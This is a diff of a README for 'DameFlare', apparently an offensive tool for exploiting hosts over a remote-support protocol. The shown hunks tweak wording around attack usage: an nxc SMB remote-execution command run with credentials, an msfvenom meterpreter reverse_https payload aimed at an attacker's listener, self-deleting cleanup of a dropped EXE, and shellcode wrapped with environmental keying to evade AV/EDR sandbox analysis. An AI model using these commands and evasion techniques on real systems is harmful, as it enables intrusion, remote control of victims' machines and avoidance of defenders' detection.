@@ -35,7 +35,7 @@ DameFlare implements the full protocol handshake (version negotiation → AES ke
 ## Installation
 
 ```bash
-git clone https://github.com/Fir3d0g/dameflare
+git clone https://github.com/fir3d0g/dameflare
 cd dameflare
 pip3 install -r requirements.txt
 python3 dameflare.py -h
@@ -80,7 +80,7 @@ python3 dameflare.py -f vuln_hosts.txt --cleanup
 
 Requires `msfvenom` in PATH. Uploads a self-deleting EXE that removes `dwDrvInst.exe` and itself after a short delay.
 
-Alternatively, if you have credentials:
+Alternatively, if you have credentials, you can use something like NXC:
 ```bash
 nxc smb <target> -u <user> -p <pass> -x "del /f /q C:\Windows\Temp\dwDrvInst.exe"
 ```
@@ -108,7 +108,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 EXITFUNC=
 
 ## Payload Evasion (ek47)
 
-Wrap raw shellcode with environmental keying to evade AV/EDR sandbox analysis. The payload will only decrypt and execute on a machine where the keys match. Sandboxes and automated analysis environments won't run it. Huge shoutout to Kevin Clark (@GuhnooPlusLinux) for his awesome work!
+Wrap raw shellcode with environmental keying to evade AV/EDR sandbox analysis. The payload will only decrypt and execute on a machine where the keys match. Huge shoutout to Kevin Clark (@GuhnooPlusLinux) for his awesome work!
 
 > [https://gitlab.com/KevinJClark/ek47](https://gitlab.com/KevinJClark/ek47)
 
